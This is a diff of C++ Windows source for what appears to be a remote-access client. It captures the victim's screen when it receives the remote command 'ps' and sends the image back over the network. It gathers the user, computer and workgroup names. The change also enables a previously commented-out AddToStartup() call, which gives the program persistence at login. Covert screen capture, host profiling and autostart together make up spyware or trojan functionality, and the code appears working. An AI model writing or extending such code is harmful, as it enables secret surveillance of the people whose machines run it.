@@ -16,15 +16,15 @@ std::vector<char> ClientServer::printScreen()
     DeleteDC(hMemoryDC);
     DeleteDC(hScreenDC);
 
-    BITMAP bitmapInfo;
-    GetObject(hBitmap, sizeof(BITMAP), &bitmapInfo);
+    BITMAP bitmap;
+    GetObject(hBitmap, sizeof(BITMAP), &bitmap);
 
     BITMAPINFOHEADER bih = { 0 };
     bih.biSize = sizeof(BITMAPINFOHEADER);
-    bih.biWidth = width;
-    bih.biHeight = height;
-    bih.biPlanes = 1;
-    bih.biBitCount = 32;
+    bih.biWidth = bitmap.bmWidth;
+    bih.biHeight = bitmap.bmHeight;
+    bih.biPlanes = bitmap.bmPlanes;
+    bih.biBitCount = bitmap.bmBitsPixel;
     bih.biCompression = BI_RGB;
     bih.biSizeImage = 0; // Можно установить в 0 для BI_RGB
     bih.biXPelsPerMeter = 0;
@@ -36,36 +36,40 @@ std::vector<char> ClientServer::printScreen()
     bi.bmiHeader = bih;
 
     // Запись битмапа в pixelData
-    std::vector<char> pixelData(bitmapInfo.bmWidthBytes * bitmapInfo.bmHeight);
+    std::vector<char> pixelData(bitmap.bmWidthBytes * bitmap.bmHeight);
     HDC hdc = GetDC(NULL);
-    GetDIBits(hdc, hBitmap, 0, bitmapInfo.bmHeight, &pixelData[0], &bi, DIB_RGB_COLORS);
+    GetDIBits(hdc, hBitmap, 0, bitmap.bmHeight, &pixelData[0], &bi, DIB_RGB_COLORS);
     ReleaseDC(NULL, hdc);
-
     DeleteObject(hBitmap);
-    image_size_data = std::to_string(bitmapInfo.bmWidth).c_str();
-    image_size_data += ' ';
-    image_size_data += std::to_string(bitmapInfo.bmHeight).c_str();
+
+
+    image_data = std::to_string(bitmap.bmWidth) + " ";
+    image_data += std::to_string(bitmap.bmHeight) + " ";
+    image_data += std::to_string(bitmap.bmPlanes) + " ";
+    image_data += std::to_string(bitmap.bmBitsPixel);
 
     return pixelData;
 }
 
-void ClientServer::handlerData(DataBuffer data, Client& client)
+void ClientServer::handlerData(DataBuffer& data, Client& client)
 {
     std::string data_str = dataToStr(data);
-    std::cout << "\nMessage received:\n";
-    std::cout << "ip: " << ipToStr(client.getHost()) << ":" << ntohs(client.getPort()) << std::endl;
-    std::cout << data_str;
+    if (data_str.empty())
+        return;
 
     if (data_str == "ps")
     {
-        std::vector<char> image_data = printScreen();
-        send_data_type = DataType::image_size;
-        sendDataBy(client.getHost(), client.getPort(), image_size_data.c_str(), image_size_data.size());
+        std::vector<char> image = printScreen();
+        send_data_type = DataType::image_data;
+        sendDataBy(client.getHost(), client.getPort(), image_data.c_str(), image_data.size());
         send_data_type = DataType::image;
-        sendDataBy(client.getHost(), client.getPort(), &image_data[0], image_data.size());
+        sendDataBy(client.getHost(), client.getPort(), &image[0], image.size());
     }
     else
     {
+        std::cout << "\nMessage received:\n";
+        std::cout << "ip: " << ipToStr(client.getHost())  << std::endl;
+        std::cout << "msg: " << data_str;
         send_data_type = DataType::message;
         sendDataBy(client.getHost(), client.getPort(), data_str.c_str(), data_str.size());
     }
@@ -74,14 +78,14 @@ void ClientServer::handlerData(DataBuffer data, Client& client)
 void ClientServer::handlerConnect(Client& client)
 {
     std::cout << "\nServer connect:\n";
-    std::cout << "ip: " << ipToStr(client.getHost()) << ":" << ntohs(client.getPort()) << std::endl;
+    std::cout << "ip: " << ipToStr(client.getHost())  << std::endl;
 }
 
 void ClientServer::handlerDisconnect(Client& client)
 {
     using namespace std::chrono_literals;
     std::cout << "\nServer disconnect:\n";
-    std::cout << "ip: " << ipToStr(client.getHost()) << ":" << ntohs(client.getPort()) << std::endl;
+    std::cout << "ip: " << ipToStr(client.getHost())  << std::endl;
 
     std::this_thread::sleep_for(20000ms);
     uint32_t host; inet_pton(AF_INET, "127.0.0.1", &host);
@@ -200,7 +204,7 @@ bool ClientServer::AddToStartup()
 
 ClientServer::ClientServer(const uint16_t port) : NetworkHandler(port)
 {
-    //AddToStartup();
+    AddToStartup();
     user_name = getUserName();
     computer_name = getComputerName();
     work_group = getWorkGroup();
